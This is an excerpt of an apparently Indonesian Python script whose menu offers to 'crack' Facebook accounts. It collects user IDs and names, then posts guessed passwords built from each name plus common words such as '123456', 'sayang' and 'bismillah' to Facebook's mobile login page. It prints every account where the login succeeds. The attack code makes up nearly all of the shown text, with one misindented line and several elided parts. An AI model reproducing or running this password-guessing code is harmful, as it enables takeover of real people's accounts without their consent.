...
def menu():
	...
	print
	print(" "+N+"[#] -------------------------------------------")
	print(" "+N+"[1] Crack from public (default)")
...
def _dds():
	...
	for i in z["data"]:
		...
		id.append(uid+'|'+nm)
	print(" "+N+"[*] Total ID  : "+str(len(id)))
	print(" "+N+"[!] Waktu crack akan memakan waktu lama menggunakan 8list sandi")
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345','sayang','bismillah','indonesia','123456','rahasia']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
...
def __sarungan____():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower(),'102030','445566','111222','786786']:
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r '+H+'[OK]'+N+' ' +uid+ '|' +pw+ '                  ')
